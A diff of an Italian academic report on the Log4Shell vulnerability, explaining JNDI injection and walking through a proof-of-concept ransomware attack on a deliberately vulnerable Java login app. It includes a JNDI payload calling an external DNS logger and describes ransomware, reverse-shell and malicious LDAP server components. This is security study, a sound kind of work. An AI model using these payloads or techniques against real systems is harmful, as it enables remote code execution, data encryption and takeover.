@@ -77,8 +77,14 @@
 \section{La vulnerabilità Log4Shell}
 Il 9 dicembre 2021 è stata resa nota pubblicamente una vulnerabità che affligge la libreria di logging \emph{\href{https://logging.apache.org/log4j/2.x/}{Apache Log4j}}, utilizzata per gestire le operazioni di logging in moltissime applicazioni Java.
 La vulnerabilità, subito rinominata \emph{Log4Shell}, è stata segnalata come critica data la larga scala su cui impatta, le conseguenze che può provocare e la sua facilità di sfruttamento.
-Lo zero-day, inizialmente annunciato con un tweet insieme ad un PoC pubblicato su github è stato ora pubblicato come \textbf{\href{https://nvd.nist.gov/vuln/detail/CVE-2021-44228}{CVE-2021-44228}}  una vulnerabilità di tipo Remote Code Execution (RCE) classificato 10 su 10 in termini di gravità. Infatti tramite il log di una determinata stringa, un cybercriminale ha la possibilità di eseguire codice arbitrario e, potenzialmente, ottenere il controllo totale del sistema su cui viene eseguita l'applicazione vittima.
- secondo gli esperti di  ha colpito il 48,3\% delle organizzazioni a livello globale. 
+Lo zero-day, inizialmente annunciato con un tweet insieme ad un PoC caricato su github è stato ora pubblicato come \textbf{\href{https://nvd.nist.gov/vuln/detail/CVE-2021-44228}{CVE-2021-44228}},  una vulnerabilità di tipo Remote Code Execution (RCE) classificato 10 su 10 in termini di gravità. Infatti, tramite il log di una determinata stringa, un cybercriminale ha la possibilità di eseguire codice arbitrario e, potenzialmente, ottenere il controllo totale del sistema su cui viene eseguita l'applicazione vittima.
+
+Il problema è stato originariamente scoperto durante una ricerca di bug sui server Minecraft, ma Log4j è presente in quasi tutte le applicazioni aziendali e i server Java.
+Ad esempio, la libreria può essere trovata in tutti i prodotti rilasciati dalla Apache Software Foundation ed è utilizzata attivamente in famosi progetti open source.
+Pertanto, anche le aziende che utilizzano uno di questi prodotti sono indirettamente vulnerabili agli attacchi Log4Shell.
+L'impatto di questa vulnerabilità è talmente esteso che secondo gli esperti ha colpito il 48,3\% delle organizzazioni a livello globale. 
+
+Allo stato attuale la maggior parte degli attacchi si concentra sul mining di criptovalute a spese delle vittime, tuttavia approfittando del rumore di fondo gli attaccanti più esperti inizano a mettere in atto attacchi per installare malware su dispositivi vulnerabili. 
 
 
 \subsection{JNDI Injection}
@@ -145,9 +151,16 @@ I requisiti per considerare un sistema una potenziale vittima di questo tipo di 
     \item Un'istruzione che effettui il log tramite log4j della stringa ricevuta.
 \end{itemize}
 
+\begin{figure}
+\centering
+\includegraphics[width=0.7\textwidth]{img/log4shell.png}
+\caption{Schema di un attacco mediante Log4Shell}
+\label{fig:log4shellschema}
+\end{figure}
+
 
 \subsection{Fasi dell'attacco}
-Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per ottenere una RCE si struttura in 4 fasi principali:
+Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per ottenere una RCE, mostrato in figura \ref{fig:log4shellschema}, si struttura in 4 fasi principali:
 
 \begin{enumerate}
     \item L'attaccante attraverso una richiesta attuata con qualsiasi portocollo (HTTP, TCP, \dots) invia al server target il payload malevolo con l'URL JNDI:
@@ -163,12 +176,6 @@ Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per otten
     \item A questo punto l'applicazione vulnerabile carica il file remoto \verb!Exploit.class!, instanziando l'oggetto Java ed eseguendo il codice del suo costruttore. Tale operazione consente all'attaccante di ottenere i privilegi di esecuzione di codice remoto sull'host.
 \end{enumerate}
 
-\begin{figure}
-\centering
-\includegraphics[width=0.7\textwidth]{img/log4shell.png}
-\caption{Schema di un attacco mediante Log4Shell}
-\label{fig:log4shellschema}
-\end{figure}
 
 \newpage
 
@@ -176,14 +183,15 @@ Un'attacco che sfrutta la vulnerabilità Log4Shell con il vettore LDAP per otten
 \section{PoC: Attacco Ransomware tramite Log4Shell}
 Per mostrare come Log4Shell possa condurre facilmente un avversario ad eseguire codice su una macchina target è stato realizzato un \emph{Proof of Concept} che illustra un tipico attacco ransomware effettuato per mezzo di questa vulnerabilità.
 
+Tutto il codice realizzato è disponibile su GitHub all'indirizzo \href{https://github.com/CriDiba/log4shell-analysis}{https://github.com/ CriDiba/log4shell-analysis}, nel repository è presente un file che descrive come effettuare il setup della macchina ai fini del funzionamento del progetto.
 
 \subsection{Macchina vittima}
 La macchina vittima è costituita da una web-app vulnerabile eseguita su un server web Apache Tomcat in ascolto sull porta 8080.
 L'applicazione web è stata sviluppata con la tecnologia JSP ed utilzza Java Servlet per l'elaborazione lato server.
 
-Il software simula una comune applicazione aziendale esposta sul web e in esecuzione su un server interno a cui è possibile accedere tramite un URL (es. www.<app-name>.com:8080).
+Il software simula una comune applicazione aziendale esposta sul web e in esecuzione su un server interno a cui è possibile accedere tramite un URL (es. \texttt{www.<app- name>.com:8080}).
 La pagina principale mostra una schermata di login nella quale è necessario inserire nome utente e password per effettuare l'accesso alla app.
-Il form di login invia una richiesta HTTP POST contenente le credenziali inserite dall'utente, che viene processata da un Login Servlet. La classe si occupa di validare le credenziali e di memorizzare in un file di log lo username degli utenti che tentano di effettuare l'accesso.
+Il form di login invia una richiesta HTTP POST contenente le credenziali inserite dall'utente, che viene processata da un Login Servlet mostrato in figura \ref{fig:loginservlet}. La classe si occupa di validare le credenziali e di memorizzare in un file di log lo username degli utenti che tentano di effettuare l'accesso.
 L'operazione di scrittura del log mediante Log4j permette di triggerare la nota vulnerabilità.
 
 \begin{figure}
@@ -202,11 +210,11 @@ L'operazione di scrittura del log mediante Log4j permette di triggerare la nota 
             String password = req.getParameter("password");
             logger.info("User " + userName + " tried to log in");
     
-            if (userName.equals("admin") && password.equals("password")) {
+            if (this.check(userName, password)) {
                 RequestDispatcher view = req.getRequestDispatcher("dashboard.jsp");
                 view.forward(req, resp);
             } else {
-                req.setAttribute("error", "Login failed: wrong user credentials");
+                req.setAttribute("error", "Login failed");
                 RequestDispatcher view = req.getRequestDispatcher("index.jsp");
                 view.include(req, resp);
             }
@@ -233,7 +241,7 @@ Si descrive ora lo svolgimento dell'attacco mediante il modello Cyber Kill Chain
 
 
 \subsubsection{Reconnaissance}
-Nella prima fase, l’attaccante interagisce con gli host e con la rete target alla ricerca di un endpoint in ascolto su qualsiasi protocollo che permetta di inviare il payload malevolo (reconnaissance attiva).
+Nella prima fase, l’attaccante interagisce con gli host e con la rete target alla ricerca di un endpoint in ascolto su qualsiasi protocollo che permetta di inviare il payload malevolo (\textbf{Active Scanning}).
 Una volta individuata l'applicazione web sulla porta 8080 alla quale inviare richieste HTTP, è opportuno assicurarsi che questa sia effettivamente vulnerabile a Log4Shell.
 
 Il modo più semplice per rilevare se un endpoint remoto è vulnerabile, consiste nell'attivare una query DNS. 
@@ -241,7 +249,7 @@ Utilizzando un logger DNS online (ad esempio \href{http://dnslog.cn}{dnslog}), �
 \begin{center}
     \verb!${jndi:ldap://fchcia.dnslog.cn/a}!
 \end{center}
-A questo punto è necessario inviare il payload attraverso una richiesta HTTP,  l'exploit farà sì che il server tenti di recuperare dei dati in remoto, permettendo di rilevare una eventuale attivazione della vulnerabilità.
+A questo punto è necessario inviare il payload attraverso una richiesta HTTP,  l'exploit farà sì che il server tenti di recuperare dei dati in remoto, permettendo di rilevare una eventuale attivazione della vulnerabilità (figura \ref{fig:dnslog}.
 \`E possibile automatizzare l'operazione attraverso strumenti come i vulnerability scanner reperibili online.
 
 \begin{figure}
@@ -252,11 +260,11 @@ A questo punto è necessario inviare il payload attraverso una richiesta HTTP,  
 \end{figure}
 
 \subsubsection{Weaponization}
-Questa fase consiste nel creare il malware per cifrare i dati e generare un payload per sfruttare la vulnerabilità identificata.
+Questa fase consiste nel creare il malware per cifrare i dati e generare un payload per sfruttare la vulnerabilità identificata (\textbf{Resource Development}).
 A tale scopo sono stati implementati i seguenti file:
 \begin{itemize}
-    \item \verb!Ransomware.java!: contiene il codice del malware che si occupa di cifrare i dati.
-    \item \verb!ReverseShell.java!: contiene il codice per aprire una reverse shell sulla macchina avversaria.
+    \item \verb!Ransomware.java!: (figura \ref{fig:ransomware}) contiene il codice del malware che si occupa di cifrare i dati.
+    \item \verb!ReverseShell.java!: (figura \ref{fig:revshell}) contiene il codice per aprire una reverse shell sulla macchina avversaria.
     \item \verb!exploit.py!: avvia i servizi LDAP e HTTP sul server attaccante e genera il payload malevolo.
 \end{itemize}
 
@@ -300,6 +308,8 @@ A tale scopo sono stati implementati i seguenti file:
                 e.printStackTrace();
             }
         }
+        
+        //...
     }
 \end{lstlisting}
     \caption{Ransomware - Codice Java}
@@ -311,7 +321,8 @@ In un attacco che sfrutta Log4j la fase di Delivery non è presente poiché la t
 
 
 \subsubsection{Exploitation}
-La fase principale dell'attacco viene attuata sfruttando la vulnerabilità di Log4j per ottenere una RCE. 
+La fase principale dell'attacco viene attuata sfruttando la vulnerabilità di Log4j per ottenere una RCE (\textbf{Exploit Public-Facing Application
+}). 
 Lo script \verb!exploit.py! presente nel progetto ha lo scopo di:
 \begin{itemize}
     \item Instanziare un server LDAP malevolo in ascolto sulla porta 1389.
@@ -322,6 +333,8 @@ Lo script \verb!exploit.py! presente nel progetto ha lo scopo di:
     \end{center}
 \end{itemize}
 
+\`E possibile osservare lo script in funzione in figura \ref{fig:exploit}.
+
 \begin{figure}
 \centering
 \includegraphics[width=0.8\textwidth]{img/exploit.png}
@@ -331,13 +344,14 @@ Lo script \verb!exploit.py! presente nel progetto ha lo scopo di:
 
 L'attaccante invia al server web il payload generato inserendolo nel campo \verb!username! del form di login.
 Apache Log4j, al momento di loggare il nome utente, effettua una richiesta JNDI al server LDAP creato, il quale restituisce il path dell'oggetto Java con il codice malevolo.
-A questo punto, l'applicazione vulnerabile carica il file remoto ed esegue il codice del ransomware.
+A questo punto, l'applicazione vulnerabile carica il file remoto ed esegue il codice del ransomware che andrà a cifrare i dati della vittima (\textbf{Data Encrypted for Impact}).
 
 \subsubsection{Installation}
 Questa fase è facoltativa ai fini dello sviluppo dell'attacco ransomware, si è comunque deciso di inserirla nel PoC con il fine di mostrare la numerosità di applicazioni a cui si presta Log4Shell.
 
 L’obiettivo dell'attaccante è quello di mantenere l’accesso alla macchina (persistenza), per fare ciò è possibile creare una \textbf{backdoor shell}.
-Tramite una ulteriore JNDI Injection si esegue il codice remoto di una classe Java che, collegandosi ad un server malevolo dell'attaccante, apre una reverse shell.
+Tramite una ulteriore JNDI Injection si esegue il codice remoto di una classe Java che, collegandosi ad un server malevolo dell'attaccante, apre una reverse shell (\textbf{Command and Scripting Interpreter
+}).
 Questo exploit permette di ottenere il totale controllo della macchina vittima e può essere usato come base per lanciare ulteriori attacchi.
 
 \begin{figure}
